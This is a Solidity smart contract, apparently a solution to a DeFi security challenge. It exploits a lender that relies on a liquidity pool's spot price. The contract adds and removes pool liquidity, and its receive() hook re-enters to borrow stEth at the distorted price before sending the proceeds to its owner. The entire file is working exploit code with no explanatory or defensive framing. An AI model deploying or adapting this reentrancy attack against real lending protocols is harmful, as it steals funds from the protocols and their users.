// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

interface ILiquidityPool {
    function addLiquidity(
        uint256 stEth_amount,
        uint256 eth_amount
    ) external payable returns (uint256);
    function removeLiquidity(
        uint256 lp_amount
    ) external returns (uint256, uint256);
    function getSpotPriceStEth(uint256 amount) external view returns (uint256);
    function getSpotPriceEth(uint256 amount) external view returns (uint256);
}

interface ILender {
    function borrowStEth(uint256 amount) external payable;
    function repay() external payable;
}

contract TokenLendExploit is Ownable {
    uint256 private constant FEE_PERCENTAGE = 5;
    uint256 private constant OVERCOLLATERALLIZATION_PERCENTAGE = 150;

    ILiquidityPool public pool;
    ILender public reader;
    IERC20 public stEth;
    bool public retrieving;

    constructor(
        address _token,
        address _pool,
        address _reader
    ) payable Ownable(msg.sender) {
        pool = ILiquidityPool(_pool);
        reader = ILender(_reader);
        stEth = IERC20(_token);
    }

    receive() external payable {
        uint256 price = pool.getSpotPriceStEth(1 ether);
        uint256 deposit = (price *
            (OVERCOLLATERALLIZATION_PERCENTAGE + FEE_PERCENTAGE)) / 100;
        reader.borrowStEth{value: deposit}(1 ether);
    }

    function exploit() public payable onlyOwner {
        stEth.approve(address(pool), 2 ether);
        uint256 mintedLP = pool.addLiquidity{value: msg.value}(
            2 ether,
            2 ether
        );

        pool.removeLiquidity(mintedLP);

        uint256 amount = stEth.balanceOf(address(this));
        stEth.transfer(owner(), amount);
        (bool success, ) = owner().call{value: address(this).balance}("");
        require(success, "Fail to send ETH");
    }
}
